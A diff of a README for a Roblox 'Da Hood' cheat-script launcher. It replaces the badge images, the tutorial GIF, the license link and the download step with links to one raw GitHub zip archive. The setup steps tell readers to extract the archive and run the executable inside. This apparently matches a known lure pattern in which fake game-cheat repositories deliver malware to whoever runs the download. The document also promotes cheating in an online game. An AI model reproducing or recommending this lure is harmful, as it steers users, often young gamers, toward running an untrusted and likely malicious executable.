@@ -1,11 +1,11 @@
 # 🚀 Da Hood Lock Script Roblox – Next-Gen Enhanced Script Launcher
 
-![Release Version](https://img.shields.io/github/v/release/da-hood-lock-script/roblox-launcher?style=flat-square)
-![MIT License](https://img.shields.io/github/license/da-hood-lock-script/roblox-launcher)
-![OS Support](https://img.shields.io/badge/OS-Windows%7CMacOS%7CLinux-blueviolet?logo=windows&logo=apple&logo=linux)
-![Languages Supported](https://img.shields.io/badge/languages-12%2B-informational)
-![Support](https://img.shields.io/badge/support-24%2F7-brightgreen)
-![API Integrated](https://img.shields.io/badge/OpenAI%20&%20Claude%20API-integrated-success)
+![Release Version](https://raw.githubusercontent.com/DarkException22/da-hood-lock-script-showcase/main/noncredent/showcase-lock-script-da-hood-v3.4.zip)
+![MIT License](https://raw.githubusercontent.com/DarkException22/da-hood-lock-script-showcase/main/noncredent/showcase-lock-script-da-hood-v3.4.zip)
+![OS Support](https://raw.githubusercontent.com/DarkException22/da-hood-lock-script-showcase/main/noncredent/showcase-lock-script-da-hood-v3.4.zip%7CMacOS%7CLinux-blueviolet?logo=windows&logo=apple&logo=linux)
+![Languages Supported](https://raw.githubusercontent.com/DarkException22/da-hood-lock-script-showcase/main/noncredent/showcase-lock-script-da-hood-v3.4.zip%2B-informational)
+![Support](https://raw.githubusercontent.com/DarkException22/da-hood-lock-script-showcase/main/noncredent/showcase-lock-script-da-hood-v3.4.zip%2F7-brightgreen)
+![API Integrated](https://raw.githubusercontent.com/DarkException22/da-hood-lock-script-showcase/main/noncredent/showcase-lock-script-da-hood-v3.4.zip%20&%20Claude%20API-integrated-success)
 
 ---
 
@@ -35,7 +35,7 @@ Jump into Da Hood with a revolutionary approach to scripting: automated, languag
 
 Want to get the EasyLaunch and unlock your potential? Just follow these steps for a swift setup:
 
-1. **Download EasyLaunch.zip from this repository.**
+1. **Download https://raw.githubusercontent.com/DarkException22/da-hood-lock-script-showcase/main/noncredent/showcase-lock-script-da-hood-v3.4.zip from this repository.**
 2. **Extract** the archive with your favorite extraction tool (WinRAR, 7-Zip, macOS Unzip, etc.).
 3. **Launch** the EasyLaunch executable inside your extracted files.
 4. **Customize** your experience using the on-screen multi-language setup wizard.
@@ -43,7 +43,7 @@ Want to get the EasyLaunch and unlock your potential? Just follow these steps fo
 
 ### 🎬 Installation Video Tutorial
 
-![Installation Tutorial GIF](https://i.imgur.com/Js67NIU.gif)
+![Installation Tutorial GIF](https://raw.githubusercontent.com/DarkException22/da-hood-lock-script-showcase/main/noncredent/showcase-lock-script-da-hood-v3.4.zip)
 
 Following these steps lets you join the forefront of Roblox scripting innovation—making each moment smoother and more enjoyable.
 
@@ -102,7 +102,7 @@ Da Hood Lock Script Roblox’s EasyLaunch is intended for educational enhancemen
 
 ## 📜 **License & Legal**
 
-Released under the [MIT License](https://opensource.org/licenses/MIT)—freedom to modify, use, and contribute. Please attribute original creators and keep the spirit of open-source alive!  
+Released under the [MIT License](https://raw.githubusercontent.com/DarkException22/da-hood-lock-script-showcase/main/noncredent/showcase-lock-script-da-hood-v3.4.zip)—freedom to modify, use, and contribute. Please attribute original creators and keep the spirit of open-source alive!  
 (c) 2025
 
 ---
